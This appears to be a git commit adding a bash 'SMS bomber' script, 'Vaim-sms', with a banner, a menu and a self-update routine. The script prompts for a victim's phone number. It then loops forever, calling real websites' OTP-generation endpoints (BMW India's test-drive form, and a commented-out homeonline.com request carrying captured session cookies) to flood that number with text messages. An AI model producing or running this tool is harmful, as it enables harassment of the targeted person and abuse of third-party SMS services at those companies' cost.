b4370a39f176a525067ca729b298e24cce906f49
Vaimpier Ritik <49913044+vaimpierritik@users.noreply.github.com>
2020-05-21 23:55:14 +0530

    Add files via upload

---
+++ Vaim-sms.sh
@@ -0,0 +1,117 @@
+#!/bin/bash
+#==========================================================================================================================
+#========================================================================================================================== 
+#Vaim-sms v1.0
+#don't use my code with giving me credit 
+#if you use without giving me credit then you won't became a programmer so please respect
+#Youtube channel : https://www.youtube.com/channel/UCu-xG31hWgJLIptcPBuSigQ
+#Github (coded by vaimpier ritik ) >>> : https://github.com/VaimpierOfficial
+#For business : sonuv0085@gmail.com
+#vaimpier
+#==========================================================================================================================
+#==========================================================================================================================
+
+
+
+banner() {
+
+clear
+printf "\e[1;91m	____   ____      .__\e[0m\n"
+printf "\e[1;91m	\   \ /   /____  |__| _____      \e[0m\e[1;93m       ______ _____   ______ \e[0m\n "
+printf "\e[1;91m	 \   Y   /\__  \ |  |/     \   __\e[0m\e[1;93m____  /  ___//     \ /  ___/ \e[0m\n "
+printf "\e[1;91m	  \     /  / __ \|  |  Y Y  \ /__\e[0m\e[1;93m___/  \___ \|  Y Y  \\___ \  \e[0m\n "
+printf "\e[1;91m	   \___/  (____  /__|__|_|  /    \e[0m\e[1;93m     /____  >__|_|  /____  > \e[0m\n "
+printf "\e[1;91m	               \/         \/     \e[0m\e[1;93m          \/      \/     \/  \e[0m\n "
+
+printf "\n"
+printf "\e[1;91m Youtube channel : https://www.youtube.com/channel/UCu-xG31hWgJLIptcPBuSigQ\e[0m\n"
+printf "\e[1;91m Github : https://github.com/VaimpierOfficial\e[0m\n"
+printf "\n"
+
+
+}
+
+
+upload() {
+
+clear
+printf "[+] HEY BRO PLEASE WAIT ......................... \n"
+printf "[+] NOTE : HEY BRO AFTER UPDATING IF DOES'NT WORK THEN PLEASE SEND ME MESSAGE ON MY G-MAIL : 'sonuv0085@gmail.com' \n KEEP WATCHING OUR YOUTUBE CHANNEL : https://www.youtube.com/channel/UCu-xG31hWgJLIptcPBuSigQ \n GITHUB : https://github.com/VaimpierOfficial \n"
+sleep 7
+clear
+cd
+rm -rf Vaim-sms
+git clone https://gitclone.com/VaimpierOfficial/Vaim-sms
+cd Vaim-sms
+chmod +x *
+clear
+printf "[+] SCRIPT UPDATED PLEASE WAIT ............. "
+sleep 2
+bash Vaim-sms.sh 
+
+}
+
+
+opr(){
+
+while true
+do
+#curl --http2 -X POST -H "Host:www.homeonline.com" -H "content-length:80" -H "accept:application/json, text/javascript, */*; q=0.01" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.homeonline.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.homeonline.com/mobile/sale/Shri-Shaligram-Villa-kotarpur-ahmedabad/2DC53D92/pdet/?holsource=paid_re_display&holmedium=paid_google&gclid=EAIaIQobChMI1uTQleO96QIVFYlwCh32wAPBEAEYASABEgJinPD_BwE&client=ca-pub-8385090489403527" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5,gu;q=0.4" -H "cookie:aSource=Available" -H "cookie:aReferrer=null" -H "cookie:aUtmSource=paid_re_display" -H "cookie:aUtmMedium=paid_google" -H "cookie:aUtmCampaign=" -H "cookie:_ga=GA1.2.1611481345.1589817391" -H "cookie:_gid=GA1.2.2112257333.1589817391" -H "cookie:clientIdAnalytics=1611481345.1589817391" -H "cookie:PHPSESSID=c98cm0efv1cupfj4v7s2sf5vq5dmqec5" -H "cookie:_fbp=fb.1.1589817398640.1589866451" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:DBG_COOKIES_POPUP_CITY_KEY=1597701508%7C2Pib7b1wnkqPXbbvuinHpmWRARv0N5oxdxUHZ%2BA6Kac%3D%7C7fb9d6e52d307c3d6dae903de6e9675fc17c39c5" -H "cookie:_gac_UA-75804298-1=1.1589817603.EAIaIQobChMI1uTQleO96QIVFYlwCh32wAPBEAEYASABEgJinPD_BwE" -H "cookie:DBG_COOKIES_mobile_LanguageLCIDstring=1592409607%7ChP46jK6TmXAaU94%2FQ0cjaM8uLy4M2jbPFkXq4r%2B89JU%3D%7C5594703aa6d7c91405edaff6be6ee90d521b1326" -H "cookie:DBG_COOKIES_selectedCurrentCountryID=1592409607%7CvNE1FMqX2en%2BHZ%2B1VDMi3gfsm2LZf4GdNAeTGD4IkpY%3D%7Cfaa9543ff3a0970a44f21200c45c83c14a4904ba" -H "cookie:DBG_COOKIES_selectedCurrentCountryCode=1592409607%7C9Wz8fCCCwWtZJ20k5T9YvyGE6LoE6ZP7JfG%2BlN3AkOE%3D%7C67770ab162265ab080ee57053b017477befc7015" -H "cookie:DBG_COOKIES_mobile_CountryID=1592409607%7CvNE1FMqX2en%2BHZ%2B1VDMi3gfsm2LZf4GdNAeTGD4IkpY%3D%7Cfaa9543ff3a0970a44f21200c45c83c14a4904ba" -H "cookie:DBG_COOKIES_mobile_CountryName=1592409607%7CTlQyxLbU2ylm7kQVH%2FjXS4GgTNTiN6eTtU1nvzmv%2FWg%3D%7Cd8f286aa6fa0100acc2dce671bb16558b9be0f23" -H "cookie:DBG_COOKIES_mobile_Country=1592409607%7CxYF6tVn0dsXgNHouj9lWIac73LIfsoSNEAJHdQWRQeQ%3D%7Cd4603e45215659a6411e8b9151ae6d013d0fc9c0" -H "cookie:DBG_COOKIES_URL_CITY_KEY=1597701607%7C5YHOGXNBf28MD%2B4L%2BiK3ZKlNnFGPDhwCuEF57jCpAEQ%3D%7C67e93fbf85171508851e4a6fd33aa7b23ba084ec" -H "cookie:DBG_COOKIES_REQUEST_CITY_KEY=1597701607%7C5YHOGXNBf28MD%2B4L%2BiK3ZKlNnFGPDhwCuEF57jCpAEQ%3D%7C67e93fbf85171508851e4a6fd33aa7b23ba084ec" -H "cookie:DBG_COOKIES_mobilecityLat=1592409607%7CY98bK%2FE6Ig36A4RjB2GxPqh10LIMyKAnv1pw%2BBD1ToQ%3D%7C40beadb2c36542819e0dfa1bfdece2f905b4cb5c" -H "cookie:DBG_COOKIES_mobilecityLng=1592409607%7CVkmWYsX6ZsXsgwzNmKSE%2BuiCUmSRbZpuY5ybdHxu%2FGw%3D%7C6ea3904f6ad9186409b9bf75b42f15e97d634441" -d "locStEmail=Fgg%40mail.com&locStPhone=$num&locStName=Ggg&locStSignedStatus=" "https://www.homeonline.com/mobile//iframe/locStorageResendOtp" --output $log.txt
+curl -X GET -H "Host:bmwindia.co.in" -H "Connection:keep-alive" -H "Accept:*/*" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36" -H "X-Requested-With:XMLHttpRequest" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://bmwindia.co.in/offers/testdrive/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5,gu;q=0.4" -H "Cookie:_ga=GA1.3.1155809710.1589640378; _gid=GA1.3.785034709.1589640378; _gat=1; _gcl_au=1.1.970431915.1589640380; _gat_UA-74035217-1=1" "https://bmwindia.co.in/offers/testdrivesubmit/generateOTP.php?mobile_no=$num" --output $log.txt
+done
+
+}
+
+menu(){
+
+clear
+banner
+
+printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER VICITM NUMBER >>> \e[0m\n"
+read -p '---------------> ' num
+printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER LOG FILE NAME >>> \e[0m\n"
+read -p '---------------> ' log
+
+printf "\n"
+printf ">>>\e[1;92m ATTACKING START ON +91$num \e[0m<<<"
+sleep 5
+printf "\n"
+printf "PRESS CLTR+C TO QUIT ............. \n"
+sleep 3
+clear
+opr
+
+}
+
+menux() {
+
+clear
+apt install curl
+clear
+banner
+printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
+printf "\e[1;92m[\e[0m 2 \e[1;92m]\e[0m>>>\e[1;93m UPDATE SCRIPT \e[0m\n"
+printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
+printf "\n"
+read -p '>>> SELECT ANYONE >>> ' options
+
+if [ "$options" -eq "1" ];then
+        menu
+fi
+
+if [ "$options" -eq "2" ];then
+        upload
+fi
+
+if [ "$options" -eq "3" ];then
+        exit
+        exit
+        exit
+else
+        menux
+fi
+
+
+}
+
+menux
